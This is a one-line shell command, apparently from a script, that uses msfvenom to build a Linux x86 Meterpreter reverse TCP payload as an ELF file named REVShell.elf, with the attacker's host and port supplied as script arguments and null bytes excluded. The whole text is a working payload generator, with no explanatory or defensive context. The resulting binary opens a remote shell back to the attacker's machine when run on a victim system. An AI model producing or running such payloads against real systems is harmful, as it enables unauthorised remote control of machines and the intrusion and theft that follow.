msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -b "\x00" -f elf -o REVShell.elf

